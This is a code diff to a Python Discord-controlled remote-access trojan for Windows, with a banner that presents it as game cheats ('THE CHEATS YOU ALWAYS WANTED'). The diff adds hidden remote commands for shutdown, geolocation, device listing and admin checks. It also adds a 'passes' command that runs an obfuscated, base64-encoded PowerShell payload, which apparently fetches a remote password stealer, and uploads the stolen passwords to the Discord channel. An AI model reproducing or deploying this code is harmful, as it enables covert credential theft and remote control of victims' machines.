@@ -1,3 +1,37 @@
+import time
+time.sleep(1)
+ASCII = """
+
+
+
+
+
+                            ╔══════════════════════════════════════════════════════════════╗
+                            ║                                                              ║
+                            ║            ██████╗ ███████╗██╗  ████████╗ ██████╗            ║
+                            ║            ██╔══██╗██╔════╝██║  ╚══██╔══╝██╔═══██╗           ║
+                            ║            ██║  ██║█████╗  ██║     ██║   ██║   ██║           ║
+                            ║            ██║  ██║██╔══╝  ██║     ██║   ██║   ██║           ║
+                            ║            ██████╔╝███████╗███████╗██║   ╚██████╔╝           ║
+                            ║            ╚═════╝ ╚══════╝╚══════╝╚═╝    ╚═════╝            ║
+                            ║            ███╗   ███╗ █████╗ ██████╗ ███████╗               ║
+                            ║            ████╗ ████║██╔══██╗██╔══██╗╚══███╔╝               ║
+                            ║            ██╔████╔██║███████║██║  ██║  ███╔╝                ║
+                            ║            ██║╚██╔╝██║██╔══██║██║  ██║ ███╔╝                 ║
+                            ║            ██║ ╚═╝ ██║██║  ██║██████╔╝███████╗               ║
+                            ║            ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝               ║
+                            ║                                                              ║
+                            ╚══════════════════════════════════════════════════════════════╝
+                    ╔══════════════════════════════╗                                    ╔══════════╗
+                    ║ THE CHEATS YOU ALWAYS WANTED ║                                    ║ by Delto ║
+                    ╚══════════════════════════════╝                                    ╚══════════╝
+
+
+
+"""
+print(ASCII)
+time.sleep(5)
+
 DEV = "tilov"
 
 import win32gui
@@ -66,6 +100,7 @@ from datetime import datetime
 import ctypes
 import ctypes.wintypes
 import time
+import inspect
 
 # Define global variables
 notification_sent = False
@@ -461,7 +496,7 @@ def format_devices(devices):
 @bot.command(help="Displays this message")
 async def help(ctx, category: str = None):
     embed_pages = []
-    hidden_commands = {"cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr"}  # Liste der versteckten Befehle
+    hidden_commands = {"cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}  # Liste der versteckten Befehle
 
     if category == "hidden":
         commands = sorted([command for command in bot.commands if command.name in hidden_commands], key=lambda x: x.name)
@@ -1069,7 +1104,7 @@ async def clear(ctx, *channels: discord.TextChannel):
         total_deleted += deleted
         end_time = time.perf_counter()  # Endzeitmessung
         total_time = end_time - start_time  # Berechnen der benötigten Zeit
-        await ctx.send(f'Cleared {deleted} messages in {total_time:.4f} seconds in {ctx.channel.mention}', delete_after=5)
+        await ctx.send(f'Cleared {deleted} messages in {total_time:.4f} seconds in {ctx.channel.mention}', delete_after=2)
     else:
         start_time = time.perf_counter()  # Startzeitmessung
         tasks = [purge_channel(channel) for channel in channels]
@@ -1077,7 +1112,7 @@ async def clear(ctx, *channels: discord.TextChannel):
         total_deleted += sum(deleted_counts)
         end_time = time.perf_counter()  # Endzeitmessung
         total_time = end_time - start_time  # Berechnen der benötigten Zeit
-        await ctx.send(f'Cleared a total of {total_deleted} messages in {total_time:.4f} seconds in the specified channels', delete_after=5)
+        await ctx.send(f'Cleared a total of {total_deleted} messages in {total_time:.4f} seconds in the specified channels', delete_after=2)
 
     try:
         await asyncio.sleep(total_time)  # Warten bis alle Löschnachrichten gelöscht sind
@@ -1721,22 +1756,26 @@ def mark_file_extensions(files):
 
 # List directory contents
 @bot.command(help="List directory contents")
-async def ls(ctx):
+async def ls(ctx, order=''):
     try:
-        files = os.listdir(current_directory)  # Verwende den aktuellen Pfad, der durch den Befehl >cd festgelegt wurde
+        if order == 'n':  # Check if the order parameter is 'n' for newest to oldest
+            files = os.listdir(current_directory)
+            files.sort(key=lambda x: os.path.getmtime(os.path.join(current_directory, x)), reverse=True)
+        else:  # Default behavior, list files alphabetically
+            files = os.listdir(current_directory)
+            files.sort()
+
         marked_files = mark_file_extensions(files)
         files_str = '\n'.join(marked_files)
 
-        # Überprüfen, ob die Länge des Textes die maximale Grenze überschreitet
         if len(files_str) <= 4096:
             embed = discord.Embed(
                 title=f"Contents of {current_directory}",
                 description=files_str,
                 color=discord.Color.blue()
             )
-            await ctx.send(embed=embed)  # Direkt senden, wenn die Länge unter oder gleich 6000 ist
+            await ctx.send(embed=embed)
         else:
-            # Text in Teile aufteilen
             chunks = [files_str[i:i + 4096] for i in range(0, len(files_str), 4096)]
             for chunk in chunks:
                 embed = discord.Embed(
@@ -1744,7 +1783,7 @@ async def ls(ctx):
                     description=chunk,
                     color=discord.Color.blue()
                 )
-                await ctx.send(embed=embed)  # Senden jedes Teils als separates Embed
+                await ctx.send(embed=embed)
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
@@ -1869,5 +1908,55 @@ async def tskmngr(ctx):
             await ctx.send(f"```\n{full_info[i:i + 1900]}\n```")
     else:
         await ctx.send(f"```\n{full_info}\n```")
+
+@bot.command(help= "check if the program has admin privileges")
+async def checkadmin(ctx):
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if is_admin == True:
+        await ctx.send("[*] Congrats you're admin")
+    elif is_admin == False:
+        await ctx.send("[!] Sorry, you're not admin")
+
+@bot.command(help="grab passwords")
+async def passes(ctx):
+    import subprocess
+    import os
+    import discord
+
+    temp = os.getenv('temp')
+    if not temp:
+        await ctx.send("Temp-Verzeichnis nicht gefunden.")
+        return
+
+    def shell(command):
+        try:
+            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+            output = result.stdout.decode('CP437').strip()
+            error = result.stderr.decode('CP437').strip()
+            if result.returncode != 0:
+                return f"Fehler beim Ausführen des Befehls: {error}"
+            return output
+        except Exception as e:
+            return f"Fehler beim Ausführen des Befehls: {e}"
+
+    powershell_command = "Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -EncodedCommand WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA="
+    passwords = shell(powershell_command)
+
+    if "Fehler beim Ausführen des Befehls" in passwords:
+        await ctx.send(passwords)
+        return
+
+    try:
+        file_path = os.path.join(temp, "passwords.txt")
+        with open(file_path, 'w') as f4:
+            f4.write(passwords)
+
+        file = discord.File(file_path, filename="passwords.txt")
+        await ctx.send("[*] Command successfully executed", file=file)
+    except Exception as e:
+        await ctx.send(f"Fehler beim Schreiben oder Senden der Datei: {e}")
+    finally:
+        if os.path.exists(file_path):
+            os.remove(file_path)
 
 bot.run(TOKEN)
